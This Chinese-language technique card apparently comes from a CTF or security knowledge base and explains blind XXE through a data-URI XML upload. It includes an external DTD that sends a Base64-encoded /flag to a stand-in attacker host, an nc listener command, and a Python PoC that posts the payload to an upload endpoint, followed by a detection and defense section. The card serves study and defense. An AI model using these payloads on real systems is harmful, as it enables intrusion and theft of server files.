---
id: web-generic-xxe-data-uri-upload-external-dtd-oob
title: data:text/xml;base64 上传包装 XXE：外部 DTD 参数实体把文件拼进 HTTP 请求外带
type: scenario
domain: web
path: web/generic/xxe
technique: data-uri-xml-upload-external-dtd-oob
aliases:
- data URI 上传 XXE
- data:text/xml;base64 XXE
- upload.php XXE
- 外部 DTD OOB 外带
- 参数实体外带文件
- 盲 XXE 外带
tags:
- web
- xxe
- oob
- data-uri
- upload
- php
- external-dtd
- exfiltration
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V244
  verified_at: '2026-11-07T12:33:26+08:00'
  notes: 已对照原文与22张图核对；data URI 上传投递、外部DTD参数实体、php://filter Base64外带、nc日志GET /ZmxhZ3t...证据均一致；原文DTD文本有截断，卡片按标准可用写法规范化并注明；未在本机复现PoC
---

## 一句话结论

上传接口把 `data` 参数当作 data URI 接收（`data:text/xml;base64,<base64>`），服务端取出 Base64 解码后交给 XML 解析器；攻击者提交带外部 DTD 的 XML，利用参数实体把目标文件内容拼进外部 HTTP 请求的 URL，再从攻击者 VPS 的访问日志中读取 Base64 编码的文件内容（文章环境为 `/flag`），形成无需回显的盲 XXE 数据外带。

## 原理

- **data URI 作为上传载体**：前端/接口约定 `data` 参数格式为 `data:<mime>;base64,<payload>`；后端按逗号切分、Base64 解码、按 MIME 类型处理。若 MIME 为 `text/xml` 且后端使用允许外部实体的 XML 解析器，解码后的 XML 就会被解析。
- **盲 XXE（OOB）**：目标不回显实体内容时，用外部 DTD 和参数实体把文件内容拼进 URL：
  - 主 XML 引用远程 DTD：`<!ENTITY % remote SYSTEM "http://attacker/evil.dtd"> %remote;`
  - DTD 中定义 `%file` 读取目标文件，并定义 `%start` 生成 `%send` 实体，把 `%file` 拼进 `http://attacker:1234/?%file;`；`%start;%send;` 触发解析器向攻击者发起请求。
- **为什么用 Base64**：`php://filter/convert.base64-encode/resource=/flag` 把文件内容编码为 Base64，避免特殊字符破坏 URL；攻击者收到请求后对路径中的 Base64 解码即得 flag。文章 nc 日志中的 `GET /ZmxhZ3t...` 正是 `flag{...}` 的 Base64。
- **前提**：XML 解析器允许 DTD/外部实体（PHP 旧版本 `libxml_disable_entity_loader(false)` 或未设置 `LIBXML_NONET` 等），且服务器可向攻击者地址发起出站 HTTP 请求。

## 触发条件

- 上传/导入接口接受 `data` 参数中的 data URI，并把 `text/xml` 内容交给 XML 解析器。
- 解析器未禁用外部实体/外部 DTD；目标 PHP/libxml 版本允许加载外部实体。
- 目标可出网到攻击者 VPS（HTTP/DNS），或允许通过错误信息外带。
- 攻击者能托管 `evil.dtd` 并监听接收端口。

## 利用步骤

1. 在公网 VPS 放置 `evil.dtd`，内容如下：
   ```dtd
   <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
   <!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://attacker:1234/?%file;'>">
   %start;
   %send;
   ```
2. 启动 HTTP 服务托管 DTD，另起 `nc -lvnp 1234` 监听外带请求。
3. 构造主 XML：
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE root [
     <!ENTITY % remote SYSTEM "http://attacker/evil.dtd">
     %remote;
     %start;
     %send;
   ]>
   <root>&lab;</root>
   ```
4. Base64 编码 XML，作为 `data=data:text/xml;base64,<base64>` POST 到上传接口（如 `/user/upload.php`）。
5. 在 nc/HTTP 日志中看到 `GET /<base64>`，对路径中的 Base64 解码即得文件内容；若读取的是 `/flag`，解码结果就是 flag。

## PoC

```python
import base64
import requests

attacker = "http://attacker"
xml = f'''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "{attacker}/evil.dtd">
  %remote;
  %start;
  %send;
]>
<root>&lab;</root>'''

data = "data:text/xml;base64," + base64.b64encode(xml.encode()).decode()
r = requests.post("http://target/user/upload.php",
                  cookies={"PHPSESSID": "<session>"},
                  headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                           "X-Requested-With": "XMLHttpRequest"},
                  data={"data": data})
print(r.text)
```

`evil.dtd` 使用 `php://filter/convert.base64-encode/resource=/flag` 时，nc 日志中的请求路径就是 flag 的 Base64；文章实测日志出现 `GET /ZmxhZ3t...`，解码即得 flag。

## 变体与关联

- **通用盲 XXE OOB**：[[web-generic-xxe-oob-exfil]] 给出外部 DTD + 参数实体的标准骨架；本卡补充“data URI 上传”这一投递入口与 php://filter Base64 外带细节。
- **上传点变体**：SVG 图片上传 XXE（[[web-generic-xxe-svg-upload-inband-file-read]]）、XML 文件上传、UTF-16BE 编码绕过（[[web-generic-xxe-utf16be-encoding-filter-bypass]]）。
- **外带通道**：HTTP 请求路径、DNS 查询、FTP、错误信息；出网受限时可尝试 DNS。
- **读取协议**：`php://filter/convert.base64-encode/resource=` 适合 PHP；Java 可用 `file://` + 错误信息/DTD 分块外带。

## 检测与防御

- 禁用 XML 外部实体与 DTD：PHP 使用 `libxml_disable_entity_loader(true)`（旧版）/`LIBXML_NONET`，Java 设置 `disallow-doctype-decl`、关闭外部通用/参数实体。
- 上传接口只接受已知 MIME 与内容类型，不解析用户提供的 XML；必须解析时使用白名单/安全解析器。
- 禁止或限制服务器出站 HTTP/DNS，监控对未知域名的出站请求；对 `data:` URI 中的 XML、`DOCTYPE`/`ENTITY` 关键字做检测。
- 日志排查：上传请求中出现 `data:text/xml`、`<!ENTITY % remote SYSTEM`、`php://filter` 等特征；出站日志中出现带 Base64 查询串的短请求。
